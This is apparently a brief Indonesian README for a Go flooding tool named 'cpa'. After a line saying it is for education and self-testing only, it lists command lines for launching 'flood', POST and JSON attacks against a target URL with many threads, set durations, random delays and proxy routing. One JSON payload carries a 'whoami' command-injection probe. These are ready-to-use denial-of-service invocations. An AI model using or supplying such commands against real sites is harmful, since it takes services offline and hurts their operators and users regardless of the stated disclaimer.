BISMILLAHIRRAHMANIRRAHIM 

Kode ini hanya untuk edukasi dan pengujian di lingkungan sendiri.

Gunakan dengan bijak dan bertanggung jawab.

# Compile
go build -o cpa cpa.go

# Lihat semua metode
./cpa -methods

# Basic attack
./cpa -target https://example.com -method flood -threads 100 -duration 60

# Dengan custom payload
./cpa -target https://example.com -method post -payload "username=admin&password=123" -threads 50 -duration 30

# Random payload
./cpa -target https://example.com -method post -random-payload -threads 100 -duration 60

# JSON payload
./cpa -target https://api.example.com -method json -payload '{"cmd":"whoami"}' -threads 50

# Dengan delay dan proxy
./cpa -target https://example.com -method flood -threads 100 -duration 60 -delay-min 100 -delay-max 500 -proxy http://127.0.0.1:8080
